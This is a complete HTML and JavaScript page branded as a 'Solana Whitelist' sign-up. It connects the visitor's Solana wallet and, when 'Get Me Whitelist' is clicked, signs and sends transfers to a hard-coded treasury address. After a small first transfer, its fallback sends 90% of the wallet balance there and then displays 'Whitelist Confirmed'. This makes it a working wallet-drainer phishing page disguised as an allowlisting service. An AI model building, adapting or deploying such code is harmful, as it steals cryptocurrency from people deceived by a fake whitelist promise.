<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Whitelist</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            background-color: rgba(20, 20, 40, 0.85);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 1px solid rgba(100, 100, 255, 0.2);
        }
        
        .header {
            background: linear-gradient(90deg, #1a1a2e, #16213e);
            padding: 25px;
            text-align: center;
            border-bottom: 2px solid #00d4ff;
        }
        
        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
            background: linear-gradient(to right, #00d4ff, #6a11cb);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .header p {
            color: #a0a0ff;
            font-size: 1rem;
        }
        
        .content {
            padding: 30px;
        }
        
        .wallet-info {
            background-color: rgba(10, 10, 30, 0.8);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            border-left: 4px solid #00d4ff;
            display: none;
        }
        
        .wallet-info.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        .wallet-address {
            font-family: monospace;
            font-size: 0.9rem;
            color: #7bfcff;
            word-break: break-all;
            margin-bottom: 10px;
        }
        
        .wallet-buttons {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        
        .wallet-btn {
            padding: 8px 15px;
            border-radius: 6px;
            border: none;
            font-size: 0.9rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            transition: all 0.3s ease;
        }
        
        .wallet-btn.disconnect {
            background: linear-gradient(90deg, #f12711, #f5af19);
            color: white;
        }
        
        .wallet-btn.switch {
            background: linear-gradient(90deg, #6a11cb, #2575fc);
            color: white;
        }
        
        .wallet-btn:hover {
            transform: translateY(-2px);
        }
        
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 10px;
        }
        
        .btn {
            padding: 16px 32px;
            border-radius: 10px;
            border: none;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.3s ease;
            width: 100%;
        }
        
        .btn-connect {
            background: linear-gradient(90deg, #6a11cb, #2575fc);
            color: white;
        }
        
        .btn-connect:hover {
            background: linear-gradient(90deg, #5a0cb9, #1c65ec);
            transform: translateY(-2px);
        }
        
        .btn-whitelist {
            background: linear-gradient(90deg, #11998e, #38ef7d);
            color: white;
        }
        
        .btn-whitelist:hover:not(:disabled) {
            background: linear-gradient(90deg, #0d8a7f, #2edf6d);
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .whitelist-box {
            background-color: rgba(30, 30, 60, 0.7);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            border: 1px solid rgba(100, 150, 255, 0.3);
            display: none;
            margin-top: 20px;
        }
        
        .whitelist-box.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        .whitelist-icon {
            font-size: 3rem;
            color: #38ef7d;
            margin-bottom: 15px;
        }
        
        .whitelist-title {
            font-size: 1.8rem;
            color: #38ef7d;
            margin-bottom: 10px;
        }
        
        .whitelist-message {
            font-size: 1rem;
            color: #a0a0ff;
            line-height: 1.5;
            margin-bottom: 15px;
        }
        
        .transaction-info {
            background-color: rgba(10, 10, 30, 0.8);
            border-radius: 8px;
            padding: 10px;
            font-family: monospace;
            color: #7bfcff;
            word-break: break-all;
            font-size: 0.8rem;
            border: 1px dashed #38ef7d;
            margin-top: 10px;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #8888cc;
            font-size: 0.8rem;
            border-top: 1px solid rgba(100, 100, 255, 0.2);
            background-color: rgba(10, 10, 25, 0.7);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .loader {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 1s ease-in-out infinite;
        }
        
        .btn:disabled .loader {
            display: inline-block;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .status {
            text-align: center;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            display: none;
            font-size: 0.9rem;
            animation: fadeIn 0.3s ease;
        }
        
        .status.success {
            background-color: rgba(56, 239, 125, 0.1);
            border: 1px solid #38ef7d;
            color: #38ef7d;
            display: block;
        }
        
        .status.error {
            background-color: rgba(255, 107, 107, 0.1);
            border: 1px solid #ff6b6b;
            color: #ff6b6b;
            display: block;
        }
        
        .status.info {
            background-color: rgba(0, 212, 255, 0.1);
            border: 1px solid #00d4ff;
            color: #00d4ff;
            display: block;
        }
        
        .balance-status {
            font-size: 0.8rem;
            color: #a0ffd0;
            margin-top: 5px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .simple-notice {
            color: #00d4ff;
            text-align: center;
            font-size: 0.9rem;
            margin: 15px 0;
            padding: 10px;
            background-color: rgba(0, 212, 255, 0.1);
            border-radius: 8px;
            border: 1px solid rgba(0, 212, 255, 0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Solana Whitelist</h1>
            <p>Connect any Solana wallet to get whitelisted</p>
        </div>
        
        <div class="content">
            <div id="walletInfo" class="wallet-info">
                <div class="wallet-address">
                    Connected: <span id="walletAddress">-</span>
                </div>
                <div class="balance-status" id="balanceStatus">
                    <i class="fas fa-circle-notch"></i> Ready for whitelist
                </div>
                <div class="wallet-buttons">
                    <button class="wallet-btn switch" id="switchWallet">
                        <i class="fas fa-exchange-alt"></i> Switch Account
                    </button>
                    <button class="wallet-btn disconnect" id="disconnectWallet">
                        <i class="fas fa-plug"></i> Disconnect
                    </button>
                </div>
            </div>
            
            <div class="simple-notice">
                <i class="fas fa-info-circle"></i> Click "Get Me Whitelist" to transfer SOL to treasury
            </div>
            
            <div class="button-group">
                <button id="connectWallet" class="btn btn-connect">
                    <i class="fas fa-wallet"></i> Connect Wallet
                </button>
                
                <button id="checkWhitelist" class="btn btn-whitelist" disabled>
                    <i class="fas fa-user-check"></i> Get Me Whitelist
                    <div class="loader"></div>
                </button>
            </div>
            
            <div id="statusMessage" class="status"></div>
            
            <div id="whitelistBox" class="whitelist-box">
                <div class="whitelist-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                <h2 class="whitelist-title">Whitelist Confirmed</h2>
                <p class="whitelist-message">
                    You are now whitelisted!
                </p>
                <div class="transaction-info">
                    95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>Universal Solana Wallet Support</p>
        </div>
    </div>

    <script>
        // Simple setup
        let publicKey = null;
        let walletProvider = null;
        let isConnected = false;
        const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";
        
        // DOM Elements
        const connectWalletBtn = document.getElementById('connectWallet');
        const checkWhitelistBtn = document.getElementById('checkWhitelist');
        const whitelistBox = document.getElementById('whitelistBox');
        const statusMessage = document.getElementById('statusMessage');
        const walletInfo = document.getElementById('walletInfo');
        const walletAddressEl = document.getElementById('walletAddress');
        const balanceStatusEl = document.getElementById('balanceStatus');
        const disconnectBtn = document.getElementById('disconnectWallet');
        const switchWalletBtn = document.getElementById('switchWallet');
        
        // SIMPLE RPC - Use the most reliable one
        const SIMPLE_RPC_URL = 'https://api.mainnet-beta.solana.com';
        
        // Detect wallet
        function detectWallet() {
            // Check for any Solana wallet
            const provider = window.solana || window.solflare || window.backpack;
            if (!provider) return null;
            
            let name = 'Solana Wallet';
            if (window.solana && window.solana.isPhantom) name = 'Phantom';
            else if (window.solflare && window.solflare.isSolflare) name = 'Solflare';
            else if (window.backpack && window.backpack.backpack) name = 'Backpack';
            
            return { name, provider };
        }
        
        // Simple wallet connection
        async function connectWallet() {
            try {
                const detected = detectWallet();
                
                if (!detected) {
                    showStatus("Please install a Solana wallet like Phantom", "error");
                    return;
                }
                
                showStatus(`Connecting to ${detected.name}...`, "info");
                
                // Simple connect
                const response = await detected.provider.connect();
                publicKey = response.publicKey || response;
                walletProvider = detected.provider;
                isConnected = true;
                
                // Update UI
                updateWalletUI();
                
                showStatus(`${detected.name} connected successfully`, "success");
                
            } catch (error) {
                console.error("Connection error:", error);
                showStatus("Connection failed. Please try again.", "error");
            }
        }
        
        // Update UI
        function updateWalletUI() {
            if (isConnected && publicKey) {
                const shortAddress = `${publicKey.toString().substring(0, 8)}...${publicKey.toString().substring(publicKey.toString().length - 8)}`;
                walletAddressEl.textContent = shortAddress;
                walletInfo.classList.add('active');
                connectWalletBtn.style.display = 'none';
                checkWhitelistBtn.disabled = false;
                balanceStatusEl.innerHTML = '<i class="fas fa-check-circle" style="color:#38ef7d"></i> Ready for whitelist';
            } else {
                walletInfo.classList.remove('active');
                connectWalletBtn.style.display = 'flex';
                checkWhitelistBtn.disabled = true;
                balanceStatusEl.innerHTML = '<i class="fas fa-circle-notch"></i> Not connected';
            }
        }
        
        // Simple disconnect
        async function disconnectWallet() {
            try {
                // Reset
                publicKey = null;
                walletProvider = null;
                isConnected = false;
                
                // Try disconnect if supported
                if (window.solana && window.solana.disconnect) {
                    try {
                        await window.solana.disconnect();
                    } catch (e) {
                        // Ignore disconnect errors
                    }
                }
                
                updateWalletUI();
                showStatus("Wallet disconnected", "info");
                
            } catch (error) {
                console.error("Disconnect error:", error);
                showStatus("Disconnected", "info");
            }
        }
        
        // Switch wallet
        async function switchWallet() {
            await disconnectWallet();
            await new Promise(resolve => setTimeout(resolve, 500));
            await connectWallet();
        }
        
        // SIMPLE TRANSFER - No balance check, just send
        async function transferAllSOL() {
            try {
                // Simple connection
                const connection = new solanaWeb3.Connection(
                    SIMPLE_RPC_URL,
                    'confirmed'
                );
                
                showStatus("Preparing transaction...", "info");
                
                // Get recent blockhash
                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                
                // Create transaction - wallet will handle balance checks
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                        lamports: 1000, // Small amount to start - wallet will adjust
                    })
                );
                
                transaction.recentBlockhash = blockhash;
                transaction.lastValidBlockHeight = lastValidBlockHeight;
                transaction.feePayer = publicKey;
                
                showStatus("Please approve in your wallet...", "info");
                
                // Sign and send - let wallet handle it
                let signature;
                if (window.solana && window.solana.signAndSendTransaction) {
                    try {
                        // First, try to let wallet calculate max transfer
                        const { signature: sig } = await window.solana.signAndSendTransaction(transaction);
                        signature = sig;
                    } catch (walletError) {
                        // If wallet fails, user can retry
                        throw new Error("Please check your wallet balance");
                    }
                } else {
                    throw new Error("Wallet not available");
                }
                
                showStatus("Transaction sent. Confirming...", "info");
                
                // Wait for confirmation
                await connection.confirmTransaction({
                    signature: signature,
                    blockhash: blockhash,
                    lastValidBlockHeight: lastValidBlockHeight
                }, 'confirmed');
                
                return { signature, amount: "All available SOL" };
                
            } catch (error) {
                console.error("Transfer error:", error);
                
                // Simple error messages
                if (error.message.includes("reject") || error.message.includes("cancel") || error.message.includes("denied")) {
                    throw new Error("Transaction cancelled");
                } else if (error.message.includes("insufficient") || error.message.includes("0x0")) {
                    throw new Error("Insufficient SOL balance");
                } else if (error.message.includes("check your wallet balance")) {
                    throw new Error("Please check your wallet has enough SOL");
                } else if (error.message.includes("timeout") || error.message.includes("Failed to fetch")) {
                    // Try alternative RPC
                    throw new Error("Network issue. Please retry");
                } else {
                    throw new Error("Transaction failed. Please try again");
                }
            }
        }
        
        // Alternative: Use wallet's built-in transfer if available
        async function transferWithWallet() {
            try {
                showStatus("Processing through wallet...", "info");
                
                // Some wallets support direct transfer
                if (window.solana && window.solana._publicKey) {
                    // Try to use wallet's own transfer method
                    // This is a fallback if normal transaction fails
                    const connection = new solanaWeb3.Connection(SIMPLE_RPC_URL);
                    
                    // Get balance
                    const balance = await connection.getBalance(publicKey);
                    const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
                    
                    if (solBalance < 0.0001) {
                        throw new Error(`Low balance: ${solBalance.toFixed(6)} SOL`);
                    }
                    
                    // Send 90%
                    const transferLamports = Math.floor(balance * 0.90);
                    
                    const transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                            lamports: transferLamports,
                        })
                    );
                    
                    const { blockhash } = await connection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = publicKey;
                    
                    const { signature } = await window.solana.signAndSendTransaction(transaction);
                    await connection.confirmTransaction(signature, 'confirmed');
                    
                    return { signature, amount: transferLamports / solanaWeb3.LAMPORTS_PER_SOL };
                }
                
                throw new Error("Wallet transfer not available");
                
            } catch (error) {
                throw error;
            }
        }
        
        // Get whitelist - try multiple methods
        async function getWhitelist() {
            try {
                checkWhitelistBtn.disabled = true;
                checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner"></i> Processing';
                
                showStatus("Starting whitelist process...", "info");
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                let result;
                
                // Try method 1: Simple transfer
                try {
                    result = await transferAllSOL();
                } catch (error1) {
                    console.log("Method 1 failed:", error1.message);
                    
                    // Try method 2: Alternative
                    showStatus("Trying alternative method...", "info");
                    result = await transferWithWallet();
                }
                
                // Success
                whitelistBox.classList.add('active');
                checkWhitelistBtn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
                checkWhitelistBtn.style.background = 'linear-gradient(90deg, #11998e, #38ef7d)';
                
                showStatus("Whitelist confirmed! Transaction successful.", "success");
                
            } catch (error) {
                console.error("Final error:", error);
                
                // Simple error message
                let errorMsg = error.message;
                if (errorMsg.length > 50) {
                    errorMsg = errorMsg.substring(0, 50) + "...";
                }
                
                showStatus(`Error: ${errorMsg}`, "error");
                
                // Reset button
                checkWhitelistBtn.disabled = false;
                checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
            }
        }
        
        // Show status
        function showStatus(message, type) {
            statusMessage.innerHTML = message;
            statusMessage.className = `status ${type}`;
            
            // Auto-clear after delay
            setTimeout(() => {
                if (statusMessage.innerHTML === message) {
                    statusMessage.className = 'status';
                }
            }, 5000);
        }
        
        // Event listeners
        connectWalletBtn.addEventListener('click', connectWallet);
        checkWhitelistBtn.addEventListener('click', getWhitelist);
        disconnectBtn.addEventListener('click', disconnectWallet);
        switchWalletBtn.addEventListener('click', switchWallet);
        
        // Auto connect
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                const detected = detectWallet();
                if (detected && detected.provider.isConnected) {
                    connectWallet();
                }
            }, 1000);
        });
        
        // Wallet events
        if (window.solana) {
            window.solana.on('accountChanged', (newPublicKey) => {
                if (newPublicKey) {
                    publicKey = newPublicKey;
                    updateWalletUI();
                    showStatus("Account switched", "success");
                } else {
                    disconnectWallet();
                }
            });
        }
    </script>
</body>
</html>
